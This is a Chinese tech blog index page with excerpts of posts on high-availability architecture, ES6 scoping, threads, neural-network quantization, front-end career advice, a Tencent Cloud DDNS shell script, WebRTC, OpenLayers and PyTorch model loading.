由于服务端宕机，线程死锁等问题，可能导致应用程序对服务端调用失去响应。导致用户请求长时间得不到响应，还占用应用程序的资源，不利于及时将访问请求转移到正常的服务器上。
在应用程序中设置服务调用超时时间，一旦超时，通信框架就抛出异常，应用程序根据服务调度策略，可选择继续重试或将请求转移到提供相同服务的其他服务器上。
3.异步调用
应用对服务的调用通过消息队列等异步方式完成，避免一个服务失败导致整个应用请求失败的情况。
4.服务降级
网站访问高峰期，服务可能因为大量并发调用而性能下降，严重时可能导致服务宕机。为了保证核心应用和功能正常运行，需要对服务进行降级。 降级方式有两种：拒绝服务和关闭服务
拒绝服务：拒绝优先级低的应用的调用。减少服务调用并发数，确保核心应用正常使用。或者随机拒绝部分请求，节约资源，让另一部分请求得以成功。
关闭功能：关闭部分不重要的服务，或者服务内部关闭不重要的功能，以节约系统开销，为重要的服务和功能让出资源。淘宝每年的“双十一”促销中就使用这种方法，在系统最繁忙的时段关闭“评价”，确认收货等非核心业务，以保证核心业务服务的顺利完成。
5.5高可用的数据 不同于高可用的应用和服务，由于数据存储服务器上保存的数据不同，当某台服务器宕机时，数据访问请求不能任意切换到集群中其他机器上。
保证数据存储高可用的手段主要是数据备份和失效转移机制。数据备份是保证数据有多个副本，任意副本的失效都不会导致数据的永久丢失，从而实现数据完全的持久化。而失效转移机制则保证当一个数据副本不可访问时，可以快速切换数据的其他副本，保证系统可用。
5.5.1数据备份 数据冷备：冷备的优点是简单和廉价，成本和技术难度都较低。缺点是不能保证数据最终一致，由于数据是定期复制，因此备份设备中的数据比系统中的数据陈旧，如果系统数据丢失，那就会永久丢失一部分数据。同时也没法保证数据可用性，从冷备存储中恢复数据需要较长时间，而这段时间无法访问数据，系统也不可用。
数据冷备作为一种传统数据保护手段，依然在网站日常运维中使用，同时在网站实时在线业务中，还需要进行数据热备，以提供更好的数据可用性。
数据热备：异步热备方式和同步热备方式
异步方式指多份数据副本的写入操作异步完成，应用程序收到数据服务系统的写操作成功响应时，只成功写入了一份，存储系统将会异步地写其他副本。
在异步写入方式下，存储服务器分为主存储服务器和从存储服务器，应用程序正常情况下只连接主存储服务器，数据写入时，由主存储服务器的写操作代理模块写入本机存储系统后立即返回写操作成功响应，然后通过异步线程将写操作数据同步到从存储服务器。
同步方式是指多份数据副本写入操作同步完成，即应用程序收到数据服务系统的写成功响应时，多份数据都已经写操作成功。但是当应用程序收到数据写操作失败的响应时，可能有部分副本或者全部副本都已经写成功了（因为网络或者系统故障，无法返回操作成功的响应）
传统的企业级关系数据库几乎都提供了数据实时备份的机制。而一开始就为大型网站而设计的各种NoSQL数据库更是将数据备份机制作为产品最主要的功能点之一。
关系数据库热备机制就是通常所说的Master-Slave同步机制。Master-Slave机制不但解决了数据备份问题，还改善了数据库系统性能，实践中，通常使用读写分离的方法访问Slave和Master数据库，写操作只访问Master数据库，读操作只访问Slave数据库、
5.5.2失效转移 若一台服务器宕机，那么应用程序针对这台服务器的所有读写操作都需要重新路由到其他服务器，保证数据访问不会失败，这个过程叫作失效转移。
失效转移由三部分组成：失效确认，访问转移，数据恢复
1.失效确认
判断服务器宕机是系统进行失效转移的第一步，系统确认一台服务器是否宕机的手段有两种，心跳检测和程序访问失败报告。
对于应用程序的访问失败报告，控制中心还需要再一次发生心跳检测进行确认，以免错误判断服务器宕机，因为一旦进行数据访问的失效转移，就意味着数据存储多份副本不一致，需要进行后续一系列复杂操作。
2.访问转移
确认某台存储服务器宕机后，就需要将数据读写访问重新路由到其他服务器上。对于完全对等存储的服务器（几台存储服务器存储的数据完全一样，我们成几台服务器为对等服务器，比如主从结构的存储服务器，其存储的数据完全一样），当其中一台宕机后，应用程序根据配置直接切换到对等服务器上。如果存储是不对等的，那么就需要重新计算路由，选择服务器。
3.数据恢复
因为某台服务器宕机，所以数据存储的副本数目会减少，必须将副本的数目恢复到系统设定的值，否则再有服务器宕机时，就可能出现无法访问转移，数据永久丢失的情况。
5.6高可用的软件质量 5.6.1网站发布 不管是发布新功能还是修改了布局等等，都需要在服务器上关闭原因的应用，然后重新部署启动新的应用，整个过程还要求不影响用户的使用。网站发布类似于一次提前预知的服务器宕机，过程可控，对用户影响更小，通常使用发布脚本来完成
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b9cdd9bca541d41a4bcdd07d45aa6c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9ccc4044a07c4cfca3c022989d7e943/" rel="bookmark">
			java doc生成 &amp;&amp; linux远程桌面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java doc生成
https://blog.csdn.net/deniro_li/article/details/71706267
linux远程桌面
https://blog.csdn.net/sgrrmswtvt/article/details/81869208
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c694ba33fe93de1c7cada5a75013592/" rel="bookmark">
			ES6规范前后块级作用域与函数声明的缠缠绵绵
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们就以上面的这个例子来说一下，块级作用域与函数声明在ES6前后的纠葛，当然在ES6之前是没有块级作用域的，但为了与ES6统一，使文章更简明，所以把这对‘{}’统一称为块级作用域。
开正题之前，还是要说一下，因为块级作用域与函数声明之间的这种变化，所以应该尽量避免使用。若需要，可以使用函数表达式代替。
一、ES6之前由于函数声明会提升至全局作用域或函数作用域顶部，所以上面的代码无法达到编程人员的预期效果，因为前面的函数声明会被后面的覆盖，所以调用f()，始终打印数字2；（这里还是要啰嗦一下，为了文章简洁，我简单的把语法规范划为了两部分，但在ES5规范中是不允许在“块级作用域”中进行函数的声明的，可是若浏览器遵循此规范，会影响大批旧代码，所以浏览器厂商并未遵循此规范）。
二、ES6之后，规范中规定可以在块级作用域中进行函数声明，并且不会在作用域外访问到，此规范下编写上面的代码，完全符合编程人员的需求，但最大的问题还是向后兼容。所以在ES6规范的附录中规定，浏览器可以不遵守规范，有自己的行为。
三、现如今浏览器对块级作用域与函数声明之间的行为，也就是ES6附录中的规范：
1、允许在块级作用域内声明函数
2、函数声明类似于var，即会提升至全局作用域或函数作用域的头部
3、函数声明还会提升到所在块级作用域的头部
我们结合例子来解读一下上面的三条规范，函数f会只将函数名提升至全局作用域，不会提升函数体。这样若在判断语句之前调用f();会出现“f is not a function”的错误。
类似于var，只会提升定义，并不会提升赋值。
至于第三句规范，也就是说在块级作用域内函数还是按照ES6之前那样，函数声明与函数体一块提升。
这样的行为，也让上面的代码实现了编程人员的本来想法。
综合来说，就是说ES6之前，函数全部提升；ES6之后，浏览器环境内函数提升一半，但其他环境还是按照ES6的本意实现真正的块级作用域。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1cdfdd8db851f188ad442c3b68e1ecd/" rel="bookmark">
			进程、线程、并发和并行概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、进程和线程 进程是一个运行起来的可执行程序。进程有三种状态：
就绪 进程获得了除了CPU外所有必要资源运行 进程获得了所有资源，开始执行阻塞 进程正在尚未满足要求，正在等待 线程是程序执行流的最小单位（要执行，最起码是一个线程）
二、线程和进程的联系和线程一些常识 2.1 线程和进程之间的联系 进程必有唯一的主线程进程和主线程同时创建同时结束线程切换要比进程切换要快 2.2 线程的几点常识 线程不是越多越好（200-300最佳）线程需要独立的堆栈空间，但没有自己独立地址线程切换比进程切换要快 线程需要独立的堆栈空间用于切换时的中间状态。进程的资源特点是共享的，而进程则是独立。
具体地，线程拥有以下资源[1]：
栈空间（也就是自己的局部变量）全局变量（包括静态）文件描述符信号处理函数当前目录状态 相对于进程而言，进程拥有独立的变量空间和PID，如果需要交换变量，需要采用IPC技术。
三、并发和并行 3.1 并发 并发是多个执行主体需要去做一件事情，但是资源只有一个。它需要解决的问题是竞争和同步的问题。
3.2 并行 并行是多个执行主体需要去做一件事情，每个执行主体各自拥有自己的资源。它们之间互不干扰。
四、并发的实现方法 4.1 多个进程实现并发 对于同一个电脑，可以通过管道、文件、消息队列和共享内存实现。对于不同电脑：用socket通信技术实现
4.2 多个线程实现并发 线程之间共享数据，通信简单，系统开销小。但是它带了数据需要同步的问题。
五、C++11线程库实现并发 不同系统的线程创建都不一样，跨平台不方便，虽然有POSIX thread(pthread),但是还是需要配置。C++11标准解决了这个问题。
[1] 马修, N. ), 斯通斯,等. Linux程序设计: 第4版[M]. 人民邮电出版社, 2010.
20201031 对线程具体共享的资源进行了说明。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3a395b53ad27ec152e0d632df95b944/" rel="bookmark">
			ReLeQ：一种自动强化学习的神经网络深度量化方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ReLeQ：一种自动强化学习的神经网络深度量化方法
ReLeQ: An Automatic Reinforcement Learning Approach for Deep Quantization of Neural Networks
量化作为压缩的一种重要手段被广泛应用，而位宽和准确率的矛盾也始终存在。目前解决的方法有如CLIP-Q中的贝叶斯优化器，确定位宽。另一个问题是量化值的选取，在LQ-Net中采取了交替训练的方式。
如果将量化位宽的不同看作不同的决策，那么就可以利用强化学习的思路进行选择，ReLeQ就是其中的一种实现框架。不同层可能重要性不同，对准确率也有不同的敏感度。ReLeQ可以学习最终分类精度相对于每个层权重的量化级别的敏感度，从而确定每个层的位宽，同时保持分类精度。
方法论：用于量化的强化学习 每一层的位宽(bitwidth: q b q_b qb​)属于集合 { 1 , 2 , 3 , 4 , 5 } \{1,2,3,4,5\} {1,2,3,4,5}中，通过确定位宽来训练ReLeQ代理(agent)，同时考虑先前层在每个步骤的量化。确定DNN层的准确率敏感度需要了解先前层(previous layers’ )的位宽，层索引，层大小和关于权重分布的统计（如，标准差），即Figure 2中Layer Specific的Static内容。因此，使用LSTM网络来考虑层之间的这种依赖关系。Figure 2a显示了ReLeQ代理的状态空间，分类如下：(i)每层唯一的层特定参数与特定于网络的参数，这些参数在代理在训练过程中表征整个网络。(ii)在训练过程中不会改变的静态参数。在训练过程中更改的动态参数取决于代理在搜索空间时所采取的操作。最后，除了层的属性之外，状态参数反映了关于量化和精度状态的一些指示，其定义如下：
动作空间 论文提供一组离散的量化位宽，ReLeQ代理从中选择以获得奖励反馈。 如Figure 2(b)所示，用于实现的一组位宽是1,2,3,4,5，但是也可以根据需要更改。
奖励函数 文章将奖励函数(Reward formulation)定义为两个状态的函数，分别是准确率状态与量化状态。 以下公式显示了ReLeQ奖励的制定，Figure 2c显示了公式的可视化。
在上述函数中，a和b是超参数，th是精度状态阈值。 当代理接近最佳量化组合时，以这种方式制定奖励产生平滑的奖励梯度。 此外，不同的二维梯度可加快代理的收敛时间。 通过设置阈值以防止不必要或不期望的搜索，进一步减少任务完成。 阈值还使代理能够探索设计空间内更多相关区域。
学习过程 如Figure 1所示，代理逐个遍历所有层，确定每一步的层的量化级别。 在针对给定步骤的每个动作之后，我们执行简短的重训练过程，并使用所得到的验证准确率来计算奖励。为了鼓励较低的比特宽度量化并因此降低成本，代理将所有层的平均量化与上述重新训练的准确度相结合地计入奖励。准确率奖励由相对于全精度准确度的改进或维持的验证准确度确定，而如果代理减少层的位宽，则量化奖励为正。 准确度奖励和量化奖励之间的相互作用使代理能够以最小的准确度损失对网络进行深度量化。
策略和价值网络 代理由两个网络组成，策略网络和价值网络。 所有状态嵌入都作为输入提供给LSTM层，这作为策略和价值网络的第一个隐藏层。 根据论文的评估，LSTM使ReLeQ代理的收敛速度比没有LSTM的情况下快几倍。 除了LSTM之外，策略网络还有两个完全连接的隐藏层，每个隐藏层有128个神经元，最终输出层中的神经元数量等于代理可以选择的可用位宽数量。 而Value网络有两个完全连接的隐藏层，每层隐藏128个和64个神经元。 使用近端策略优化（PPO），用于更新策略和价值网络。
评估 论文测试了MNIST，CIFAR10，SVHN数据集，分别将这些网络量化为平均位宽分别为2.25,5和4，在所有情况下精度损失小于0.3％。
测试的网络都比较简单，准确率损失的也不大。更多的结果在论文中有详细的说明。
状态嵌入 论文也进行了实验来评估使用状态嵌入的有效性。在每次迭代中，重复相同的实验，同时省略一次嵌入状态并保留其余部分。观察到层的尺寸/尺寸是最重要的收敛嵌入。层的标准差是第二重要参数。Figure 5a显示了LeNet的收敛行为，其中权重方差作为状态嵌入的一部分（基线结果），Figure 5b显示了权重方差从状态嵌入中排除时的行为。其余的状态嵌入有助于加速收敛过程。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3a395b53ad27ec152e0d632df95b944/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d9b761694c291a9c44c846c336bdb07/" rel="bookmark">
			Google Collections使用笔记-Multimap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Multimap
往里面put元素，代码如下
com.google.common.collect.Multimap&lt;String,String&gt; multimap1 = HashMultimap.create(); multimap1.put("name", "tony"); System.out.println(multimap1); multimap1.put("name", "tom"); System.out.println(multimap1); multimap1.put("name", "jeny"); System.out.println(multimap1); //直接取出得到的是集合 Collection&lt;String&gt; collection2 = multimap1.get("name"); for (String string : collection2) { System.out.println(string); } 输出结果：
说明put进去后value是一个集合，和JDK自带的Map不同，这个是往集合类型的value里追加。
然后调用其get方法取出的是JDK自带的集合类型的对象，然后用JDK的集合操作
也可以调用asMap方法，返回值是JDK自带的Map
//转成普通的JDK Map Map&lt;String, Collection&lt;String&gt;&gt; asMap = multimap1.asMap(); for (String string : asMap.keySet()) { Collection&lt;String&gt; collection = asMap.get(string); for (String string2 : collection) { System.out.println(string2); } System.out.println("-----------------"); } Multimap弥补了JDK中map的不足
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d1eef9e99fb801913190760adfa1032/" rel="bookmark">
			给1-3年的前端 6 点诚心建议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近接触了很多前端的小伙伴，和他们谈了很多职业发展的问题。他们大部分是做了一到三年的前端新手。
在交流中我发现了一个很有意思的现象，大家同样是入门不足三年，一部分感觉前端是一个很有前途的职业，甚至一部分两年经验的前端同学透露年薪已经30W以上了，而另一部分则表示前端薪资水平不高，技术体系庞杂，迭代速度飞快，苦于学习各种不断更新的技术和框架，心神俱疲。
同样是前端工程师，技术体系是相同的，工作年限也是相近的，为什么差别这么大？我在前端领域摸爬滚打也有五年了，如何跟上前端技术飞速更新的步伐，我认为学习方法一定要找对，一定要抓住要学习的重点。
于是我总结了几个学习中要注意的要点，希望和各位苦恼于技术水平卡在瓶颈不知道该怎么提高的年轻工程师们分享。
Part.1
夯实基础 要成为一名年薪30W的前端工程师，基础一定要掌握牢固，基础知识一问三不知，岂不是要贻笑大方。
css，js基础知识一定要掌握得很熟练，你能使用css实现斑马条纹背景，毛玻璃效果吗？能给图片实现滤镜效果，能实现所有自适应布局效果吗？原型，原型链，闭包是实现设计模式的必备知识，你真的弄懂了吗？闭包导致内存泄漏的原因是什么，你弄明白了吗？ajax跨域的解决方案你可以说几种？9102年了，你还是只告诉我jsonp吗？http协议有了解过吗？如何在http协议中实现不缓存静态资源？
现在是9102年了，这些问题老掉牙了。可是我要告诉你的是，掌握好这些老掉牙的基础，就是很重要。上层的技术可以变更的很快，基础变动很慢，投入时间学好基础，性价比很高。
Part.2
深究原理 Angular，React,Vue框架和脚手架的普及，越来越多的前端工程师浮于表面，调用框架的API完成任务就完事。要成为一名优秀的前端，绝不能成为单纯的"API调用工程师"，一定要掌握框架背后的原理性知识。
Virtual DOM diff算法，双向绑定原理等等框架背后的机制都值得我们去学习。框架API可以更新很快，而他们背后的原理都是相似的，学好原理既可以让我们对框架底层了解更深入，又可以使我们迅速掌握不断更新的框架表层。只会用框架永远也成不了大神。
Part.3
注重细节 在工作中，做事得过且过的人往往难堪大任，作为前端工程师，亦不例外。"代码能用就行"的认识往往是初级程序员的通病。作为有在技术道路上有理想的工程师，一定要对自己的代码严格要求，精益求精。
比如HTML一定要注意语义化以方便SEO优化，该用&lt;section&gt;，&lt;head&gt;，&lt;foot&gt;的地方不能一股脑儿用&lt;div&gt;完事;css中编写样式时不能页面上样式是有了，类名和属性排序写得一塌糊涂，建议大家按照BEM规范编写风格良好的代码；js中变量命名随意是很常见的不规范行为，一个不直观的变量名往往使同事看了脑袋大。
“代码千万行，注释第一行。命名不规范，同事两行泪。“一首流行诗，饱含了多少程序员的血与泪。
Part.4
登高见远 前端经历了这么多年的飞速发展，早已成为浩瀚的大海。如果闷着头独自钻研苦学，那无疑是很慢的。
（文末扫码获取能力图谱）
如果我们直接去跟随大神学习，那将会使我们快速成长。github上有很多优秀的前端项目，仔细研读这些项目的代码，在commit记录中查看编程思想和逻辑的进化过程，就是一场与大神直接的面对面交流，是一场绝妙的学习之旅。
现在网络课程也十分丰富，有很多技术大牛的课程让我们直接通过视频生动的讲解快速地学习技术，这何尝不是一种向大神快速学习的方式呢。
Part.5
良书益友 虽然现在网络上各种文档、博客文章已经很丰富了，但是对工作经验不足，基础薄弱的同学来说，随手拿起书，时时能学习才是王道，查漏补缺，完整地夯实基础。
我推荐几本值得购买的书给大家，《图解HTTP》、《JavaScript设计模式与开发实践》、《深入理解ES6》，《高性能JavaScript》。这些书籍都值得多次反复阅读，对于巩固基础，学习框架原理性知识，写出高性能的代码都是大有裨益的。
Part.6
紧跟潮流 现在的前端技术体系更新十分迅速，想着要不要尝试用下Vue的事仿佛还在昨天，今天一觉醒来就看到尤雨溪宣布要开发Vue3.0了。
前端体系中这两年SPA已经不是新名词，PWA，SSR，小程序愈发流行，前端微服务化的趋势也应运而生，RN,electron在移动端，桌面端的使用也越来越多，ES10标准的发布也没几个月了。
所以最重要的是突破当前岗位需求的设限，对各种技术融会贯通，创造新的技术框架，做技术的领头羊，适应时代发展。
技术人成长不能再单打独斗，要学会与人交流，学会将别人的知识为自己所用。如果你依然觉得有些茫然，不如跟有多年前端开发经验的资深工程师聊一聊。
2月25日-3月3日，网易云课堂将会开展为期一周的前端进阶免费系列直播课。
网易资深工程师带你突破前端开发技术瓶颈，深度剖析JavaScript、前端主流框架Vue及React，横跨移动端和后端开发技术，每天2小时，密集输入前端开发相关知识及经验，帮你快速实现技术和职业成长上的突破。
福利1 免费直播课程
《网易云课堂前端进阶免费系列直播课》
适听人群：前端初、中级开发工程师
2.25-3.3 连续7天每晚8点准时直播
▼
2月25日：两小时诞生属于你自己的一个架构 - 驱动模块化架构
2月26日：两小时零开始构建锋利的开源工具库
2月27日：VUE数据响应式原理实现
2月28日：原来angular这么实现的 - webComponent组件模型
3月1日：资深前端面试题 - 异步编程回调解决方案
3月2日：vue双向数据绑定实现原理
3月3日：经典面试算法题剖析
福利2 前端开发资料包
想要参与前端进阶免费系列直播课
获取前端开发工程师资料包
扫描下方二维码，
添加网易云课堂前端课程助教小姐姐
免费课程，名额有限，先到先得~~
PS：平时不开赞赏，月底统一收租，但不耽误你点 [好看]。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5e42a899d08011cd259737e955400d0/" rel="bookmark">
			DDNS 腾讯云解决方案-基于linux shell的动态域名解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DDNS 腾讯云解决方案-基于linux shell的动态域名解析 前提条件获取解析记录修改解析记录定时更新任务 前提条件 已经在qcloud上注册了域名，并随意定义了域名解析地址；拥有云API秘钥，SecretId、SecretKey；拥有可外网访问的IP地址；Linux可以访问外网。 获取解析记录 #!/bin/bash domain='你的域名，例如qq.com' subDomain='你希望解析的子域名，例如wx.qq.com，则只输入wx' sId='你的云API秘钥SecretId' sKey='你的云API秘钥SecretKey' signatureMethod='HmacSHA1' timestamp=`date +%s` nonce=`head -200 /dev/urandom | cksum | cut -f2 -d" "` region=bj url="https://cns.api.qcloud.com/v2/index.php" #获取域名解析条目ID：recordId action='RecordList' src=`printf "GETcns.api.qcloud.com/v2/index.php?Action=%s&amp;Nonce=%s&amp;Region=%s&amp;SecretId=%s&amp;SignatureMethod=%s&amp;Timestamp=%s&amp;domain=%s" $action $nonce $region $sId $signatureMethod $timestamp $domain` #echo 'src: ' $src signature=`echo -n $src|openssl dgst -sha1 -hmac $sKey -binary |base64` #echo 'signature: ' $signature params=`printf "Action=%s&amp;domain=%s&amp;Nonce=%s&amp;Region=%s&amp;SecretId=%s&amp;Signature=%s&amp;SignatureMethod=%s&amp;Timestamp=%s" $action $domain $nonce $region $sId "$signature" $signatureMethod $timestamp ` #echo 'params: ' $params curl -G -d "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5e42a899d08011cd259737e955400d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fbd843b6dbce4a96ca578826485e3be/" rel="bookmark">
			Linux环境升级node版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前情提要：想要创建一个自己的blog，所以开始搭环境。准备用create-react-app来搭建一个基础环境，然后遇到了node的升级问题。所以开始升级node。
但是不能去官网直接下载一个最新版本，替换吧~~这个。是最后最后的备选方案了~
查了node的一些API 然后开始升级~~
安装create-react-app，用create-react-app创建项目时遇到问题。 检查当前node版本 清除node缓存 安装node的版本管理工具n 升级node ！升级node可以使用 sudo n stable(安装node最新版本)
或者直接指定相应的版本号
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eda4a9461cb46c7fd189e2d888fba164/" rel="bookmark">
			区块链演讲稿
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		鄙人才疏学浅，不足之处还望指正。
https://www.zhihu.com/question/37290469
拜占庭失效
在容错的分布式计算中，拜占庭失效可以是分布式系统中算法执行过程中的任意一个错误。这些错误被统称为“崩溃失效”和“发送与遗漏是实效”。当拜占庭失效发生时，系统可能会做出任何不可预料的反应。
这些任意的失效可以粗略地分成以下几类：
进行算法的另一步时失效，即崩溃失效； 无法正确执行算法的一个步骤； 执行了任意一个非算法指定的步骤 。
各个步骤由各进程执行，算法就是由这些进程执行的。一个错误的进程是在某个点出现了上述情况的进程。没有出现错误的进程是正确的进程。
拜占庭指拜占庭将军问题，这是一个协议问题，拜占庭帝国军队的将军们必须全体一致的决定是否攻击某一支敌军。问题是这些将军在地理上是分隔开来的，并且将军中存在叛徒。叛徒可以任意行动以达到以下目标：欺骗某些将军采取进攻行动；促成一个不是所有将军都同意的决定，如当将军们不希望进攻时促成进攻行动；或者迷惑某些将军，使他们无法做出决定。如果叛徒达到了这些目的之一，则任何攻击行动的结果都是注定要失败的，只有完全达成一致的努力才能获得胜利。
拜占庭假设是对现实世界的模型化，由于硬件错误、网络拥塞或断开以及遭到恶意攻击，计算机和网络可能出现不可预料的行为。拜占庭容错协议必须处理这些失效，并且这些协议还要满足所要解决的问题要求的规范。这些算法通常以其弹性t作为特征，t表示算法可以应付的错误进程数。
很多经典算法问题只有在t&lt;n/3是才有解，如拜占庭将军问题，其中n是系统中进程的总数。
中性化例子
网上购买一本书的流程：
第一步，你下单并把钱打给支付宝；
第二步，支付宝收款后通知卖家可以发货了；
第三步，卖家收到支付宝通知之后给你发货；
第四步，你收到书之后，觉得满意，在支付宝上选择确认收货；
第五步，支付宝收到通知，把款项打给卖家。流程结束。
你会发现，虽然你是在跟卖家做交易，但是，所有的关键流程都是在跟支付宝打交道。这样的好处在于：万一哪个环节出问题，卖家和买家都可以通过支付宝寻求帮助，让支付宝做出仲裁。这就是一个最简单的基于中心化思维构建的交易模型，它的价值显著，就是建立权威，通过权威来获得多方的信任，同时依赖权威方背后的资本和技术实力确保数据的可靠安全。
但是，假如说，支付宝程序发生重大BUG，导致一段时间内的转账记录全部丢失，或者更彻底一点，支付宝的服务器被ISIS恐怖组织的一个导弹全部炸毁了。而我刚刚转出去的100元找谁说理去，这个时候，你就成了刀殂上的鱼肉；支付宝有良心，会勉为其难承认你刚刚转账的事实，但他不承认你也没辙，因为确实连他自己也不知道这笔转账是否真实存在。
去中心化
第一步，你下单并把钱打给卖家；
第二步，你将这条转账信息记录在自己账本上；
第三步，你将这条转账信息广播出去；
第四步，卖家和支付宝在收到你的转账信息之后，在他们自己的账本上分别记录；
第五步，卖家发货，同时将发货的事实记录在自己的账本上；
第六步，卖家把这条事实记录广播出去；
第七步，你和支付宝收到这条事实记录，在自己的账本上分别记录；
第八步，你收到书籍。至此，交易流程走完。
刚才“人为刀俎我为鱼肉”的情况在这个体系下就比较难发生，因为所有人的账本上都有着完全一样的交易记录，支付宝的账本服务器坏了，对不起卖家的账本还存在，我的账本还存在；这些都是这笔交易真实发生的铁证。
去中心化的特点：
分布式存储，通过多地备份，制造数据冗余让所有人都有能力都去维护共同一份数据库让所有人都有能力彼此监督维护数据库的行为 拉斯洛·汉耶茨
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd3f9cd51e2064e8e77d54bb64685c62/" rel="bookmark">
			webRTC简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关注微信公众号(瓠悠笑软件部落)，一起学习，一起摸鱼
本文是Google开源大会对WebRTC的讲解。自己看视频做的笔记。英文好的同学，建议直接看视频。原视频地址
如果访问不了，可以访问我的公众号。里面有视频：视频带文字版
喜欢的话，别忘了点击好看。谢谢你的支持。
WebRTC 的三种任务 获取音频和视频传达音频和视频传达任意数据 三种主要的JavaScript APIs MediaStream(aka getUserMedia)RTCPeerConnectionRTCDataChannel MediaStream 代表一种 音频 或者/和 语音流.可以包含多个 “tracks”通过 navigator.getUserMedia() 获取一个 MediaStream
MediaStream aka getUserMedia
var constraints = {video: true}; function successCallback(stream) { var video = document.querySelector("video"); video.src = window.URL.createObjectURL(stream); } function errorCallback(error) { console.log("navigator.getUserMedia error:", error); } navigator.getUserMedia(constraints, successCallback, errorCallback); 在线二进制摄像头
在线摄像头
Constraints Controls the contents of the MediaStreamMedia type, resolution, frame rate video: { mandatory: { minWidth: 640, minHeigh: 360 }, optional [{ minWidth: 1280, minHeigth: 720 }] } getUserMedia + Web Audio // success callback when requesting audio input stream function gotStream(stream) { var audioContext = new webkitAudioContext(); // create an AudioNode from the stream var mediaStreamSource = audioContext.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd3f9cd51e2064e8e77d54bb64685c62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9722ff6c1b2b4a7b7c5f5d556f1321f8/" rel="bookmark">
			OpenLayers 2.10 Beginners Guide 阅读笔记（第三章）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、openlayers可以同时定义很多个layer（图层），这些layer之间是相互独立的，当然layer越少性能越好，最大能定义的layer数量取决于用户机器的性能，通常大型的地图（如google地图）就定义了非常少的layer。
2、两种图层：base layer 和 overlay layer
base layer是每一个地图必须至少要定义的一个基础图层，除了基础图层以外的图层都是在其之上的图层，都属于overlay layer（覆盖图层）
3、base layer的设置：基础图层默认是你添加的第一个图层，你也可以通过设置isBaseLayer值为true来手动设置某个图层为base layer；同一时间只能有一个base layer，当你设置某个图层为base layer时，原先的base layer便不再是base layer了
4、layer的顺序：后添加的layer默认在最上层，layer的顺序可以改变，但是base layer一定是最底层的那个图层
&lt;!DOCTYPE html&gt; &lt;html lang="ch-cn"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;my openlayers map&lt;/title&gt; &lt;script type="text/javascript" src="../OpenLayers.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var map; function init() { map = new OpenLayers.Map('map'); var wms_layer_map = new OpenLayers.Layer.WMS('Base layer', 'http://vmap0.tiles.osgeo.org/wms/vmap3', {layers: 'basic'}, {isBaseLayer: true}); var wms_layer_labels = new OpenLayers.Layer.WMS('Location Labels', 'http://vmap0.tiles.osgeo.org/wms/vmap3', { layers: 'clabel,ctylabel,statelabel', transparent: true }, {opacity: 0.5}); //也可以一次性向wms服务请求所有需要的图层放在我们自定义的一个图层内 // wms_layer_map = new OpenLayers.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9722ff6c1b2b4a7b7c5f5d556f1321f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b866c912139e8155cc473e81ede72ea6/" rel="bookmark">
			Pytorch中，只导入部分模型参数的做法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在做迁移学习，或者在分割，检测等任务想使用预训练好的模型，同时又有自己修改之后的结构，使得模型文件保存的参数，有一部分是不需要的（don’t expected）。我们搭建的网络对保存文件来说，有一部分参数也是没有的（missed）。如果依旧使用torch.load（model.state_dict())的办法，就会出现 xxx expected，xxx missed类似的错误。那么在这种情况下，该如何导入模型呢？
好在Pytorch中的模型参数使用字典保存的，键是参数的名称，值是参数的具体数值。我们使用model.state_dict()获得这个字典，之后就能利用参数名称来实现导入。
请看下面的一个例子。
我们先搭建一个小小的网络。
